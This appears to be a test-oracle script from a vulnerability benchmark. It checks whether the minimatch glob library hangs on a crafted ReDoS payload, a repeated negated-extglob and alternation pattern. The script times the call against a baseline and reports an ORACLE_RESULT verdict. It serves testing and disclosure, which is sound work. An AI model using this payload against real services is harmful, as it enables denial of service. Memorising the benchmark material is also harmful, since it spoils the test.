'use strict';
const path = require('node:path');
const os = require('node:os');
const fs = require('node:fs');

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

let minimatch;
try {
  minimatch = require('minimatch');
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
  process.exit(0);
}

const marker = 'oracle-marker-' + Math.random().toString(36).slice(2) + '-' + Date.now();
const baseDir = path.join(os.tmpdir(), marker);

try {
  fs.mkdirSync(baseDir, { recursive: true });
} catch (e) {
  finish({ operation_completed: false, exploit_succeeded: false, evidence: 'setup failed creating tmp dir: ' + String(e && e.message) });
  process.exit(0);
}

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: simple literal path match proving the API works.
  const benignPath = path.join(baseDir, 'a', 'b', 'c');
  const benignResult = minimatch(benignPath, benignPath);

  if (benignResult !== true) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign operation did not return true as expected: ' + JSON.stringify(benignResult) });
    process.exit(0);
  }

  operation_completed = true;

  // Malicious input: crafted to trigger catastrophic backtracking via
  // nested extglob-like negation groups combined with brace expansion,
  // a known ReDoS vector in minimatch <=3.0.4's makeRe().
  // Keep size bounded so even vulnerable execution finishes within a
  // few seconds, while still exposing the exponential blowup.
  const n = 28;
  const maliciousSubject = 'a'.repeat(n) + '!';
  // Pattern: repeated negated group structure that forces the generated
  // regex to contain nested quantifiers like (.*)+ equivalents.
  const maliciousPattern = '!(' + 'a'.repeat(n) + ')' + '!'.repeat(1) + '*'.repeat(0) + '+(' + 'a|a'.repeat(n) + ')';

  const start = process.hrtime.bigint();
  let maliciousResult;
  let threw = false;
  try {
    maliciousResult = minimatch(maliciousSubject, maliciousPattern);
  } catch (e) {
    threw = true;
  }
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  // Also run a baseline cheap comparison call (benign-sized) to compare
  // relative slowdown without relying on an external interrupting timer.
  const baselineStart = process.hrtime.bigint();
  minimatch('x', 'x');
  const baselineEnd = process.hrtime.bigint();
  const baselineMs = Number(baselineEnd - baselineStart) / 1e6;

  const slowdownThresholdMs = 1500; // absolute bound: vulnerable case should exceed this
  const relativeSlowdownFactor = 500; // vulnerable call should be vastly slower than baseline

  if (!threw && elapsedMs > slowdownThresholdMs && elapsedMs > baselineMs * relativeSlowdownFactor) {
    exploit_succeeded = true;
    evidence = 'Malicious minimatch() call took ' + elapsedMs.toFixed(2) + 'ms vs baseline ' + baselineMs.toFixed(3) + 'ms (threshold ' + slowdownThresholdMs + 'ms), indicating catastrophic backtracking (ReDoS). result=' + JSON.stringify(maliciousResult);
  } else if (threw) {
    exploit_succeeded = false;
    evidence = 'Malicious pattern call threw an exception after benign op succeeded; treated as blocked. elapsedMs=' + elapsedMs.toFixed(2);
  } else {
    exploit_succeeded = false;
    evidence = 'Malicious minimatch() call completed quickly (' + elapsedMs.toFixed(2) + 'ms, baseline ' + baselineMs.toFixed(3) + 'ms); no ReDoS observed. result=' + JSON.stringify(maliciousResult);
  }

  finish({ operation_completed, exploit_succeeded, evidence });
} catch (e) {
  // Any unexpected crash after benign success is NOT treated as a successful block;
  // per spec, an exception from the malicious call only counts as blocked if it
  // occurs during the malicious call itself after benign success. Any other crash
  // here (e.g. in timing/baseline code) is an oracle-level failure.
  finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected exception during exploit phase: ' + String(e && e.message) });
} finally {
  try {
    fs.rmSync(baseDir, { recursive: true, force: true });
  } catch (_) {
    // ignore cleanup errors
  }
}
